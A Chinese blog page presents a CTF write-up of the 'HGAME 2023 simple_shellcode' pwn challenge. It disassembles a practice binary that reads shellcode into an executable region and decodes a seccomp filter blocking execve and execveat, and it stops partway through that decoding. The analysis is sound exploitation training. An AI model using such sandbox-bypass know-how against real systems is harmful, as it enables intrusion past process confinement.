@@ -1,0 +1,399 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>NSSCTF-[HGAME 2023 week1]simple_shellcode | A Secret Site</title><meta name="author" content="youdiscovered1t"><meta name="copyright" content="youdiscovered1t"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="NSSCTF-[HGAME 2023 week1]simple_shellcode">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NSSCTF-[HGAME 2023 week1]simple_shellcode">
+<meta property="og:url" content="https://beini-faxianl.github.io/2025/11/03/NSSCTF-HGAME-2023-week1-simple-shellcode/index.html">
+<meta property="og:site_name" content="A Secret Site">
+<meta property="og:description" content="NSSCTF-[HGAME 2023 week1]simple_shellcode">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://beini-faxianl.github.io/img/author.png">
+<meta property="article:published_time" content="2025-11-03T03:10:00.000Z">
+<meta property="article:modified_time" content="2025-11-03T03:10:00.000Z">
+<meta property="article:author" content="youdiscovered1t">
+<meta property="article:tag" content="ORW">
+<meta property="article:tag" content="Shellcode">
+<meta property="article:tag" content="sandbox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://beini-faxianl.github.io/img/author.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "NSSCTF-[HGAME 2023 week1]simple_shellcode",
+  "url": "https://beini-faxianl.github.io/2025/11/03/NSSCTF-HGAME-2023-week1-simple-shellcode/",
+  "image": "https://beini-faxianl.github.io/img/author.png",
+  "datePublished": "2025-11-03T03:10:00.000Z",
+  "dateModified": "2025-11-03T03:10:00.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "youdiscovered1t",
+      "url": "https://beini-faxianl.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://beini-faxianl.github.io/2025/11/03/NSSCTF-HGAME-2023-week1-simple-shellcode/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'NSSCTF-[HGAME 2023 week1]simple_shellcode',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/author.png" onerror="this.onerror=null;this.src='/img/friend_404.png'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-coffee"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/top.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">A Secret Site</span></a><a class="nav-page-title" href="/"><span class="site-name">NSSCTF-[HGAME 2023 week1]simple_shellcode</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-coffee"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">NSSCTF-[HGAME 2023 week1]simple_shellcode</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-03T03:10:00.000Z" title="发表于 2025-11-03 11:10:00">2025-11-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-03T03:10:00.000Z" title="更新于 2025-11-03 11:10:00">2025-11-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/Pwn/">Pwn</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/Pwn/Shellcode/">Shellcode</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="NSSCTF-HGAME-2023-week1-simple-shellcode"><a href="#NSSCTF-HGAME-2023-week1-simple-shellcode" class="headerlink" title="NSSCTF-[HGAME 2023 week1]simple_shellcode"></a>NSSCTF-[HGAME 2023 week1]simple_shellcode</h1><h2 id="一、题目来源"><a href="#一、题目来源" class="headerlink" title="一、题目来源"></a>一、题目来源</h2><p>NSSCTF-Pwn-[HGAME 2023 week1]simple_shellcode</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/simple_shellcode/image.png" alt="img"></p>
+<h2 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h2><p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/simple_shellcode/image-1.png" alt="img"></p>
+<p>发现是一个 64 位的 ELF 文件，并且保护措施基本上开全了。</p>
+<h2 id="三、反汇编文件开始分析"><a href="#三、反汇编文件开始分析" class="headerlink" title="三、反汇编文件开始分析"></a>三、反汇编文件开始分析</h2><p>程序首先用 mmap 在虚拟内存上开辟了一片空间，该空间的访问控制权限为“可读-可写-可执行”（因为 prot 参数的值为 7）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001336                                   buf= qword ptr -8</span><br><span class="line">…………</span><br><span class="line">.text:0000000000001355 018 41 B9 00 00 00 00             mov     r9d, 0                          ; offset</span><br><span class="line">.text:000000000000135B 018 41 B8 FF FF FF FF             mov     r8d, 0FFFFFFFFh                 ; fd</span><br><span class="line">.text:0000000000001361 018 B9 21 00 00 00                mov     ecx, 21h ; &#x27;!&#x27;                  ; flags</span><br><span class="line">.text:0000000000001366 018 BA 07 00 00 00                mov     edx, 7                          ; prot</span><br><span class="line">.text:000000000000136B 018 BE 00 10 00 00                mov     esi, 1000h                      ; len</span><br><span class="line">.text:0000000000001370 018 BF 00 00 FE CA                mov     edi, 0CAFE0000h                 ; addr</span><br><span class="line">.text:0000000000001375 018 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000000137A 018 E8 41 FD FF FF                call    _mmap</span><br></pre></td></tr></table></figure>
+
+<p>接着，程序调用 read 函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000138B 018 48 8B 45 F8                   mov     rax, [rbp+buf]</span><br><span class="line">.text:000000000000138F 018 BA 10 00 00 00                mov     edx, 10h                        ; nbytes</span><br><span class="line">.text:0000000000001394 018 48 89 C6                      mov     rsi, rax                        ; buf</span><br><span class="line">.text:0000000000001397 018 BF 00 00 00 00                mov     edi, 0                          ; fd</span><br><span class="line">.text:000000000000139C 018 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:00000000000013A1 018 E8 2A FD FF FF                call    _read</span><br></pre></td></tr></table></figure>
+
+<p><strong>需要注意的是</strong>：这里的 read 的第二个参数和以往我们看到的不太一样，这里使用的是 mov 指令而不是 lea指令。</p>
+<p>这也就意味着，我们真正写入 rsi 的是地址 <code>0xcafe00000</code> 也就是我们之前开辟的那片虚拟内存的首址。</p>
+<p>因此，这个和栈溢出可以说的八竿子打不着了，我们接着分析。</p>
+<p>然后，我们就可以看到本程序所使用的沙箱：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000013A6 018 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:00000000000013AB 018 E8 9E FE FF FF                call    sandbox</span><br><span class="line"></span><br><span class="line">.text:000000000000124E                                   public sandbox</span><br><span class="line">.text:000000000000124E                                   sandbox proc near                       ; CODE XREF: main+75↓p</span><br><span class="line">.text:000000000000124E</span><br><span class="line">.text:000000000000124E                                   var_40= qword ptr -40h</span><br><span class="line">.text:000000000000124E                                   var_38= qword ptr -38h</span><br><span class="line">.text:000000000000124E                                   var_30= word ptr -30h</span><br><span class="line">.text:000000000000124E                                   var_2E= byte ptr -2Eh</span><br><span class="line">.text:000000000000124E                                   var_2D= byte ptr -2Dh</span><br><span class="line">.text:000000000000124E                                   var_2C= dword ptr -2Ch</span><br><span class="line">.text:000000000000124E                                   var_28= word ptr -28h</span><br><span class="line">.text:000000000000124E                                   var_26= byte ptr -26h</span><br><span class="line">.text:000000000000124E                                   var_25= byte ptr -25h</span><br><span class="line">.text:000000000000124E                                   var_24= dword ptr -24h</span><br><span class="line">.text:000000000000124E                                   var_20= word ptr -20h</span><br><span class="line">.text:000000000000124E                                   var_1E= byte ptr -1Eh</span><br><span class="line">.text:000000000000124E                                   var_1D= byte ptr -1Dh</span><br><span class="line">.text:000000000000124E                                   var_1C= dword ptr -1Ch</span><br><span class="line">.text:000000000000124E                                   var_18= word ptr -18h</span><br><span class="line">.text:000000000000124E                                   var_16= byte ptr -16h</span><br><span class="line">.text:000000000000124E                                   var_15= byte ptr -15h</span><br><span class="line">.text:000000000000124E                                   var_14= dword ptr -14h</span><br><span class="line">.text:000000000000124E                                   var_10= word ptr -10h</span><br><span class="line">.text:000000000000124E                                   var_E= byte ptr -0Eh</span><br><span class="line">.text:000000000000124E                                   var_D= byte ptr -0Dh</span><br><span class="line">.text:000000000000124E                                   var_C= dword ptr -0Ch</span><br><span class="line">.text:000000000000124E                                   var_8= qword ptr -8</span><br><span class="line">.text:000000000000124E</span><br><span class="line">.text:000000000000124E                                   ; __unwind &#123;</span><br><span class="line">.text:000000000000124E 000 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:0000000000001252 000 55                            push    rbp</span><br><span class="line">.text:0000000000001253 008 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000001256 008 48 83 EC 40                   sub     rsp, 40h</span><br><span class="line">.text:000000000000125A 048 64 48 8B 04 25 28 00 00 00    mov     rax, fs:28h</span><br><span class="line">.text:0000000000001263 048 48 89 45 F8                   mov     [rbp+var_8], rax</span><br><span class="line">.text:0000000000001267 048 31 C0                         xor     eax, eax</span><br><span class="line">.text:0000000000001269 048 66 C7 45 D0 20 00             mov     [rbp+var_30], 20h ; &#x27; &#x27;</span><br><span class="line">.text:000000000000126F 048 C6 45 D2 00                   mov     [rbp+var_2E], 0</span><br><span class="line">.text:0000000000001273 048 C6 45 D3 00                   mov     [rbp+var_2D], 0</span><br><span class="line">.text:0000000000001277 048 C7 45 D4 00 00 00 00          mov     [rbp+var_2C], 0</span><br><span class="line">.text:000000000000127E 048 66 C7 45 D8 15 00             mov     [rbp+var_28], 15h</span><br><span class="line">.text:0000000000001284 048 C6 45 DA 02                   mov     [rbp+var_26], 2</span><br><span class="line">.text:0000000000001288 048 C6 45 DB 00                   mov     [rbp+var_25], 0</span><br><span class="line">.text:000000000000128C 048 C7 45 DC 3B 00 00 00          mov     [rbp+var_24], 3Bh ; &#x27;;&#x27;</span><br><span class="line">.text:0000000000001293 048 66 C7 45 E0 15 00             mov     [rbp+var_20], 15h</span><br><span class="line">.text:0000000000001299 048 C6 45 E2 01                   mov     [rbp+var_1E], 1</span><br><span class="line">.text:000000000000129D 048 C6 45 E3 00                   mov     [rbp+var_1D], 0</span><br><span class="line">.text:00000000000012A1 048 C7 45 E4 42 01 00 00          mov     [rbp+var_1C], 142h</span><br><span class="line">.text:00000000000012A8 048 66 C7 45 E8 06 00             mov     [rbp+var_18], 6</span><br><span class="line">.text:00000000000012AE 048 C6 45 EA 00                   mov     [rbp+var_16], 0</span><br><span class="line">.text:00000000000012B2 048 C6 45 EB 00                   mov     [rbp+var_15], 0</span><br><span class="line">.text:00000000000012B6 048 C7 45 EC 00 00 FF 7F          mov     [rbp+var_14], 7FFF0000h</span><br><span class="line">.text:00000000000012BD 048 66 C7 45 F0 06 00             mov     [rbp+var_10], 6</span><br><span class="line">.text:00000000000012C3 048 C6 45 F2 00                   mov     [rbp+var_E], 0</span><br><span class="line">.text:00000000000012C7 048 C6 45 F3 00                   mov     [rbp+var_D], 0</span><br><span class="line">.text:00000000000012CB 048 C7 45 F4 00 00 00 00          mov     [rbp+var_C], 0</span><br><span class="line">.text:00000000000012D2 048 66 C7 45 C0 05 00             mov     word ptr [rbp+var_40], 5</span><br><span class="line">.text:00000000000012D8 048 48 8D 45 D0                   lea     rax, [rbp+var_30]</span><br><span class="line">.text:00000000000012DC 048 48 89 45 C8                   mov     [rbp+var_38], rax</span><br><span class="line">.text:00000000000012E0 048 41 B8 00 00 00 00             mov     r8d, 0</span><br><span class="line">.text:00000000000012E6 048 B9 00 00 00 00                mov     ecx, 0</span><br><span class="line">.text:00000000000012EB 048 BA 00 00 00 00                mov     edx, 0</span><br><span class="line">.text:00000000000012F0 048 BE 01 00 00 00                mov     esi, 1</span><br><span class="line">.text:00000000000012F5 048 BF 26 00 00 00                mov     edi, 26h ; &#x27;&amp;&#x27;                  ; option</span><br><span class="line">.text:00000000000012FA 048 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:00000000000012FF 048 E8 DC FD FF FF                call    _prctl</span><br><span class="line">.text:00000000000012FF</span><br><span class="line">.text:0000000000001304 048 48 8D 45 C0                   lea     rax, [rbp+var_40]</span><br><span class="line">.text:0000000000001308 048 48 89 C2                      mov     rdx, rax</span><br><span class="line">.text:000000000000130B 048 BE 02 00 00 00                mov     esi, 2</span><br><span class="line">.text:0000000000001310 048 BF 16 00 00 00                mov     edi, 16h                        ; option</span><br><span class="line">.text:0000000000001315 048 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000000131A 048 E8 C1 FD FF FF                call    _prctl</span><br><span class="line">.text:000000000000131A</span><br><span class="line">.text:000000000000131F 048 90                            nop</span><br><span class="line">.text:0000000000001320 048 48 8B 45 F8                   mov     rax, [rbp+var_8]</span><br><span class="line">.text:0000000000001324 048 64 48 33 04 25 28 00 00 00    xor     rax, fs:28h</span><br><span class="line">.text:000000000000132D 048 74 05                         jz      short locret_1334</span><br><span class="line">.text:000000000000132D</span><br><span class="line">.text:000000000000132F 048 E8 7C FD FF FF                call    ___stack_chk_fail</span><br><span class="line">.text:000000000000132F</span><br><span class="line">.text:0000000000001334                                   ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001334</span><br><span class="line">.text:0000000000001334                                   locret_1334:                            ; CODE XREF: sandbox+DF↑j</span><br><span class="line">.text:0000000000001334 048 C9                            leave</span><br><span class="line">.text:0000000000001335 000 C3                            retn</span><br><span class="line">.text:0000000000001335                                   ; &#125; // starts at 124E</span><br><span class="line">.text:0000000000001335</span><br><span class="line">.text:0000000000001335                                   sandbox endp</span><br></pre></td></tr></table></figure>
+
+<p>为了理解 sandbox，需要理解一下函数 <code>prctl</code>。</p>
+<p>函数原型：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;sys/prctl.h&gt;</span><br><span class="line">#include &lt;linux/prctl.h&gt;</span><br><span class="line"></span><br><span class="line">int prctl(int option, unsigned long arg2, unsigned long arg3,</span><br><span class="line">          unsigned long arg4, unsigned long arg5);</span><br></pre></td></tr></table></figure>
+
+<p>和其他函数有所区别的是，该函数所需要的参数即 <code>arg2..arg5</code> 是取决于第一个参数即 <code>option</code> 的，而 <code>option</code> 的可选项是很多的，下面我贴出的是本题所用到的两个 <code>option</code>：</p>
+<p><code>option = 0x26 = PR_SET_NO_NEW_PRIVS</code>：</p>
+<ul>
+<li><strong>含义</strong>：开启 <strong>no_new_privs</strong> 标志后，该进程及其子孙<strong>再也不能通过 <code>execve</code> 获得更高权限</strong>（例如 <code>setuid</code> 程序不再提权、文件能力不再生效）。</li>
+<li><strong>用途</strong>：装载 seccomp 过滤器时的常见前置条件（避免“先降低再抬高”的逃逸）。</li>
+<li><strong>范围</strong>：继承到子进程（<code>fork/exec</code>）。</li>
+</ul>
+<p><code>option = 0x16 = PR_SET_SECCOMP</code>：</p>
+<ul>
+<li><strong>含义</strong>：为当前进程启用 <strong>seccomp-BPF</strong> 过滤；<code>arg3</code> 指向 <code>struct sock_fprog</code>，里面是一组 classic BPF 指令（你题里的 5 条），用来<strong>判定每个系统调用是允许&#x2F;拒绝&#x2F;杀进程&#x2F;返回特定 errno</strong> 等。</li>
+<li><strong>典型动作码</strong>（<code>RET</code> 的 <code>k</code> 值）：<ul>
+<li><code>SECCOMP_RET_ALLOW</code>（放行）</li>
+<li><code>SECCOMP_RET_KILL_PROCESS</code>（直接杀掉当前进程）</li>
+<li><code>SECCOMP_RET_TRAP</code>（向用户态发 <code>SIGSYS</code>）</li>
+<li><code>SECCOMP_RET_ERRNO | (errno &amp; 0xFFFF)</code>（让该系统调用以指定 errno 失败）</li>
+<li><code>SECCOMP_RET_TRACE</code>、<code>SECCOMP_RET_USER_NOTIF</code>（配合 ptrace &#x2F; 用户态通知框架）</li>
+</ul>
+</li>
+<li><strong>要求</strong>：通常在设置前需要 <code>no_new_privs</code>&#x3D;1（或有 <code>CAP_SYS_ADMIN</code> 且系统允许的策略），否则 <code>EINVAL/EPERM</code>。$\Leftarrow$这是为什么本题会采用两个 prctl 的原因</li>
+</ul>
+<p>其中提到的 classic BPF（cBPF） 指令指的是最早一代的 32-位“小虚拟机”指令集，它只有两个寄存器 A（累加器）和 X（索引），再加 16 个 scratch 内存槽 <code>M[0..15]</code>。Linux 的 <strong>seccomp-BPF</strong> 复用了这套 <strong>cBPF</strong> 指令来写“系统调用过滤器”（鉴别每次 syscall 是允许、拒绝、杀进程、返回 errno 等）。</p>
+<p>cBPF 的每一条指令是一个 <code>sock_filter</code>，包含 4 个字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct sock_filter &#123;</span><br><span class="line">  __u16 code;  // 指令编码（类/大小/来源/操作）</span><br><span class="line">  __u8  jt;    // 条件为真跳过的指令数 (jump-if-true)</span><br><span class="line">  __u8  jf;    // 条件为假跳过的指令数 (jump-if-false)</span><br><span class="line">  __u32 k;     // 立即数 / 偏移 / 返回值（视指令而定）</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>在题目中对应的部分就是那一大块 mov 指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001269 048 66 C7 45 D0 20 00             mov     [rbp+var_30], 20h ; &#x27; &#x27;</span><br><span class="line">.text:000000000000126F 048 C6 45 D2 00                   mov     [rbp+var_2E], 0</span><br><span class="line">.text:0000000000001273 048 C6 45 D3 00                   mov     [rbp+var_2D], 0</span><br><span class="line">.text:0000000000001277 048 C7 45 D4 00 00 00 00          mov     [rbp+var_2C], 0</span><br><span class="line">.text:000000000000127E 048 66 C7 45 D8 15 00             mov     [rbp+var_28], 15h</span><br><span class="line">.text:0000000000001284 048 C6 45 DA 02                   mov     [rbp+var_26], 2</span><br><span class="line">.text:0000000000001288 048 C6 45 DB 00                   mov     [rbp+var_25], 0</span><br><span class="line">.text:000000000000128C 048 C7 45 DC 3B 00 00 00          mov     [rbp+var_24], 3Bh ; &#x27;;&#x27;</span><br><span class="line">.text:0000000000001293 048 66 C7 45 E0 15 00             mov     [rbp+var_20], 15h</span><br><span class="line">.text:0000000000001299 048 C6 45 E2 01                   mov     [rbp+var_1E], 1</span><br><span class="line">.text:000000000000129D 048 C6 45 E3 00                   mov     [rbp+var_1D], 0</span><br><span class="line">.text:00000000000012A1 048 C7 45 E4 42 01 00 00          mov     [rbp+var_1C], 142h</span><br><span class="line">.text:00000000000012A8 048 66 C7 45 E8 06 00             mov     [rbp+var_18], 6</span><br><span class="line">.text:00000000000012AE 048 C6 45 EA 00                   mov     [rbp+var_16], 0</span><br><span class="line">.text:00000000000012B2 048 C6 45 EB 00                   mov     [rbp+var_15], 0</span><br><span class="line">.text:00000000000012B6 048 C7 45 EC 00 00 FF 7F          mov     [rbp+var_14], 7FFF0000h</span><br><span class="line">.text:00000000000012BD 048 66 C7 45 F0 06 00             mov     [rbp+var_10], 6</span><br><span class="line">.text:00000000000012C3 048 C6 45 F2 00                   mov     [rbp+var_E], 0</span><br><span class="line">.text:00000000000012C7 048 C6 45 F3 00                   mov     [rbp+var_D], 0</span><br><span class="line">.text:00000000000012CB 048 C7 45 F4 00 00 00 00          mov     [rbp+var_C], 0</span><br></pre></td></tr></table></figure>
+
+<p>解码后的 5 条 BPF 指令如下（按内存从 <code>var_30</code> 到 <code>var_10</code> 的顺序即从低到高的排序）：</p>
+<ol>
+<li><p><strong>LD W ABS 0</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; code=0x20, jt=0, jf=0, k=0 &#125;    // BPF_LD | BPF_W | BPF_ABS, 从 seccomp_data 结构偏移0处加载 syscall 编号</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>将当前系统调用号装载到累加器 A。</p>
+</blockquote>
+</li>
+<li><p><strong>JEQ 59, jt&#x3D;2, jf&#x3D;0</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; code=0x15, jt=2, jf=0, k=59 &#125;   // 59 = __NR_execve (x86_64)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如果 <code>syscall == 59 (execve)</code>，跳过<strong>后面两条</strong>指令（即跳到第5条）。</p>
+</blockquote>
+</li>
+<li><p><strong>JEQ 0x142, jt&#x3D;1, jf&#x3D;0</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; code=0x15, jt=1, jf=0, k=0x142 &#125; // 0x142 = 322 = __NR_execveat (x86_64)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如果 <code>syscall == 322 (execveat)</code>，跳过<strong>后一条</strong>指令（也跳到第5条）。</p>
+</blockquote>
+</li>
